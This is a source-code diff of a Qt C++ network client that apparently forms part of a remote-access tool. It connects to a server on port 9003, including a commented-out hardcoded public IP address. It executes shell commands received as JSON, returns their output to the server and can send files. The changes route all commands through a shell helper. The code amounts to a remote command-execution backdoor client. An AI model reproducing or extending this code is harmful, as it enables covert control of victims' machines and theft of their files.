@@ -1,7 +1,6 @@
 #include "client.h"
 #include "utility.h"
 
-#include <QProcess>
 #include <QString>
 #include <QDebug>
 #include <QDir>
@@ -27,13 +26,13 @@ void Client::connectToServer()
     connect(this, &QTcpSocket::readyRead, this, &Client::messageFromServer);
     //connect(this, &QTcpSocket::connected, this, &Client::clientConnected);
 
+    //this->connectToHost("23.254.225.170", 9003);
     this->connectToHost("localhost", 9003);
 }
 
 void Client::cmdReceived(QJsonObject d)
 {
     auto program = d.value("program").toString();
-    //std::cout << "Programm: " << program.toStdString() << std::endl;
     if (program == "cd")
     {
         try
@@ -60,28 +59,11 @@ void Client::cmdReceived(QJsonObject d)
 
 void Client::executeCommand(const QString &program, const QString &args)
 {
-#ifdef __WIN32
+
     auto cmd = program + " " + args;
     //std::cout << "Command: " << cmd.toStdString() << std::endl;
     auto result = util::Utility::excuteCommand(cmd.toStdString());
     sendResponse(QString::fromStdString(result));
-#else
-    std::unique_ptr<QProcess> p(new QProcess);
-    p->setProcessChannelMode(QProcess::MergedChannels);
-    p->setProgram(program);
-    auto tmp = args;
-    //qDebug() << "[LOG] Arg string: " << tmp;
-    if (!tmp.isEmpty())
-    {
-        auto args = tmp.split(" ");
-        p->setArguments(args);
-    }
-    p->start();
-    p->waitForStarted();
-    p->terminate();
-
-    sendResponse(p->readAll());
-#endif
 }
 
 void Client::sendFile(const QString &fileName)
